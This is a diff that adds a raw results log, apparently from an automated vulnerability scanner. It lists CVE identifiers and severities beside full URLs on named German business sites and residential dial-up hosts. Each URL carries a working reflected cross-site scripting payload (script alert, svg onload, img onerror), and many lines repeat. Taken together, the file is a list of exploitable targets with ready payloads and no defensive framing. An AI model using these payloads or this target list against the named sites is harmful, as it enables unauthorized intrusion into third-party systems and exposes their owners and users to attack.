@@ -1,0 +1,118 @@
+[CVE-2018-5316] [http] [medium] https://mail.seelig-aufzugstechnik.de/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2020-6171] [http] [medium] https://iprint.crossdigital.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+[CVE-2021-29625] [http] [medium] https://iso-9001-audit.hiertesten.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2019-15713] [http] [medium] https://mail.rolfpieper-galabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.rolfpiepergalabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2021-29625] [http] [medium] https://mail.schulz-hardware.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2020-6171] [http] [medium] https://iprint.crossdigital.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+[CVE-2019-15713] [http] [medium] https://mail.rolfpieper-galabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.rolfpiepergalabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-14696] [http] [medium] https://mail.sansiba.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+[CVE-2019-15713] [http] [medium] https://mail.sbl-uwe-schulz.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2021-26722] [http] [medium] https://mail.rostock-werbeagentur.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2096] [http] [medium] http://mail.schroeder-kunststofftechnik.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2018-5316] [http] [medium] https://mail.seelig-aufzugstechnik.de/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-14696] [http] [medium] https://mail.sansiba.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+[CVE-2020-6171] [http] [medium] https://iprint.crossdigital.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+[CVE-2019-14696] [http] [medium] https://mail.sansiba.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+[CVE-2019-15713] [http] [medium] https://mail.sbl-uwe-schulz.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2021-29625] [http] [medium] https://iso-9001-audit.hiertesten.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2019-15713] [http] [medium] https://mail.rolfpieper-galabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.rolfpiepergalabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-14696] [http] [medium] https://mail.sansiba.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+[CVE-2019-15713] [http] [medium] https://mail.sbl-uwe-schulz.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2021-26722] [http] [medium] https://mail.rostock-werbeagentur.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+[CVE-2021-37833] [http] [medium] https://ishbane.de/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1
+[top-xss-params] [http] [medium] http://mail.schwabacher-energie-genossenschaft.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
+[CVE-2020-6171] [http] [medium] https://iprint.crossdigital.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+[CVE-2021-29625] [http] [medium] https://iso-9001-audit.hiertesten.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2021-37833] [http] [medium] https://ishbane.de/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2096] [http] [medium] http://mail.schroeder-kunststofftechnik.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2096] [http] [medium] http://mail.schroeder-kunststofftechnik.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-14696] [http] [medium] https://mail.sansiba.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2020-6171] [http] [medium] https://iprint.crossdigital.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+[CVE-2021-29625] [http] [medium] https://iso-9001-audit.hiertesten.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2019-14696] [http] [medium] https://mail.sansiba.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+[CVE-2019-15713] [http] [medium] https://mail.sbl-uwe-schulz.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2021-29625] [http] [medium] https://mail.schulz-hardware.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2096] [http] [medium] http://mail.schroeder-kunststofftechnik.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2021-26722] [http] [medium] https://mail.rostock-werbeagentur.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2021-26722] [http] [medium] https://mail.rostock-werbeagentur.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+[CVE-2021-29625] [http] [medium] https://iso-9001-audit.hiertesten.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2019-15713] [http] [medium] https://mail.rolfpieper-galabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.rolfpiepergalabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.sbl-uwe-schulz.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2021-29625] [http] [medium] https://mail.schulz-hardware.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2021-37833] [http] [medium] https://ishbane.de/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1
+[CVE-2019-14696] [http] [medium] https://mail.sansiba.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2096] [http] [medium] http://mail.schroeder-kunststofftechnik.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2021-37833] [http] [medium] https://ishbane.de/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2021-37833] [http] [medium] https://ishbane.de/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-28351] [http] [medium] https://itzehoe-lokal.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[CVE-2021-37833] [http] [medium] https://ishbane.de/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1
+[CVE-2019-14696] [http] [medium] https://mail.sansiba.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+http://p3ee22d9b.dip0.t-ipconnect.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://p4fc23a30.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p4fd05c36.dip0.t-ipconnect.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://p4fd622bc.dip0.t-ipconnect.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://p4ff7391b.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p508a3fdb.dip0.t-ipconnect.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://p5090a8e4.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p5092333e.dip0.t-ipconnect.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p50930ffe.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p50933b72.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p50939913.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p50939f88.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p5093a538.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p5093aa64.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p5093cdc6.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p50972a87.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p5098933d.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p5483054a.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p548308ea.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p548a28f4.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://p548a28f4.dip0.t-ipconnect.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://p5093da7f.dip0.t-ipconnect.de/?author=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2020-2036] [http] [high] http://i-tablet.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[CVE-2020-2036] [http] [high] http://iwwtt.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+[top-xss-params] [http] [medium] http://mail.schwabacher-energie-genossenschaft.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
+[CVE-2020-6171] [http] [medium] https://iprint.crossdigital.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+[CVE-2021-29625] [http] [medium] https://iso-9001-audit.hiertesten.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2019-15713] [http] [medium] https://mail.rolfpieper-galabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.rolfpiepergalabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.rolfpieper-galabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.rolfpiepergalabau.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2019-15713] [http] [medium] https://mail.sbl-uwe-schulz.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2021-29625] [http] [medium] https://mail.schulz-hardware.de/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+[CVE-2018-5316] [http] [medium] https://mail.seelig-aufzugstechnik.de/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
